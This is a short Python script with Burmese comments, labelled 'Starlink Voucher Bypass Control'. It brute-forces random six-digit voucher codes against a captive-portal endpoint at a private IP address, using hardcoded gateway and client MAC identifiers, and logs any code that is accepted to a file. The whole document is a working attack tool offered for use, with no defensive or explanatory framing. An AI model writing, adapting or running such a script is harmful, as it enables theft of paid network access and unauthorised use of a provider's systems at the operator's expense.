import time
import random
import os
import sys
import requests

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'      # မရသော ကုဒ် (Fail)
GREEN = '\033[92m'    # ရသော ကုဒ် (Success)
WHITE = '\033[97m'    # လက်ရှိသုံးနေသော ကုဒ်
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def clear_screen():
    os.system('clear')

def start_scanning():
    clear_screen()
    print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
    print(f"{WHITE}[+] Range: 000000 - 999999 (Randomly Searching){END}")
    print(f"{YELLOW}[!] Scanning in progress...{END}\n")
    
    time.sleep(1)
    print(f"{CYAN}[+] Checking Bypass...{END}")
    time.sleep(0.5)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
    time.sleep(0.5)

    while True:
        # 0 မှ 999999 အထိ ကျပန်း Code ထုတ်ခြင်း
        code = str(random.randint(0, 999999)).zfill(6)
        
        # ၁။ လက်ရှိသုံးနေတဲ့ ကုဒ်ကို အဖြူရောင်နဲ့ပြခြင်း
        print(f"{WHITE}[*] Currently Testing: {code}{END}", end='\r')
        sys.stdout.flush()
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            res = requests.get(url, params=params, timeout=2)
            
            # ၂။ မရတဲ့ ကုဒ်ဆိုရင် အနီရောင်နဲ့ပြခြင်း
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            
            # ၃။ ရတဲ့ ကုဒ်ဆိုရင် အစိမ်းရောင်နဲ့ပြခြင်း
            elif res.status_code == 200:
                print(f"{GREEN}\n[!!!] SUCCESS FOUND: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Voucher: {code} | Date: {time.ctime()}\n")
                break
        except:
            pass
        
        # စာတန်းတွေ အရမ်းမမြန်အောင် အနည်းငယ် ထိန်းထားခြင်း
        time.sleep(0.1)

if __name__ == "__main__":
    start_scanning()
